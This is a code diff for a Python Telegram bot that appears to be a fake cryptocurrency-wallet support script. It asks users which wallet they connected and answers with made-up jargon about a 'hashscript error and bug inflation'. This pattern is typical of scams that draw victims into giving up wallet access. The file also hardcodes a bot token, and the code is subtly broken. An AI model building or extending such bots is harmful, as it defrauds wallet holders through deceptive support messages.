@@ -14,16 +14,20 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
 logger = logging.getLogger(__name__)
 TOKEN = '5751562706:AAHP1bVDHWWV_2smAceLajMp-UI6ApIPTIE'
 
+bot = telebot.TeleBot('TOKEN')
+
 def start(update, context):
     """Send a message when the command /start is issued."""
     update.message.reply_text('Hi, how are you doing and how may I help you ?')
 
+@bot.message_handler(content_types=['text'])
+
 def first_question_step( message):
-    msg = dp.send_message(message.chat.id, 'Which wallet account did you use to connect?')
-    dp.register_next_step_handler(msg, second_step)
+    msg = bot.send_message(message.chat.id, 'Which wallet account did you use to connect?')
+    bot.register_next_step_handler(msg, second_step)
 
 def second_step(message):
-    msg = dp.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
+    msg = bot.send_message(message.chat.id, 'I understand what the problem is your installed wallet is currently facing a BOT response delay due to some hashscript error and bug inflation, that is the main reason why your account activities could not be processed successfully.')
 
 
 
